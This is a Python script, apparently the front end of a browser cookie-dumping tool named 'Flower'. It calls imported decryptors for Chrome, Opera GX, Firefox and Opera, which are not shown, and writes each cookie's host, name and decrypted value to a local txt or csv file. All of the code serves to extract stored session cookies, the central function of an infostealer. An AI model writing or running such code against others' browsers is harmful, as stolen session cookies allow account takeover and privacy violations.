import colorama
import sys

# Browsers
from decryptors import Chrome, OperaGX, Firefox, Opera

browsers = [
        Chrome.Chrome(),
        OperaGX.OperaGX(),
        Firefox.Firefox(),
        Opera.Opera() 
    ]

colorama.init(True)

version = 0.1


print(colorama.Fore.GREEN + """
$ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ 
$   _____.__                                $
$ _/ ____\  |   ______  _  __ ___________   $
$ \   __\|  |  /  _ \ \/ \/ // __ \_  __ \\  $
$  |  |  |  |_(  <_> )     /\  ___/|  | \/  $
$  |__|  |____/\____/ \/\_/  \___  >__|     $
$                                \/         $
$ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $
""")
print(f"- Build of Flower: {colorama.Fore.GREEN}{version}\n")

# Few allowed write types:
# 1. txt
# 2. csv
save_type = sys.argv[sys.argv.index("-type") + 1]

def WriteCookies(name, storage):
    out = ""

    match save_type:
        case "txt":
            for data in storage:
                host = data["host"]
                name2 = data["name"]
                value = data["value"]

                out += f"{host} | {name2} | {value}\n"
        case "csv":
            out += "Host, Name, Value\n\n"
            for data in storage:
                host = data["host"]
                name2 = data["name"]
                value = data["value"]

                out += f"{host}, {name2}, {value}\n"
        case _:
            print(f"{colorama.Fore.RED}bro selected unknown output type :skull:")
            exit()

    with open(f"{name}.{save_type}", "w") as file:
        file.write(out)

for browser in browsers:
    if f"-{browser.GetBrowser().lower()}" in sys.argv:
        data = browser.Decrypt()

        WriteCookies(browser.GetBrowser(), data)
        print(f"[+] {colorama.Fore.GREEN}Total {browser.GetBrowser()} cookies: {colorama.Fore.WHITE}{len(data)}")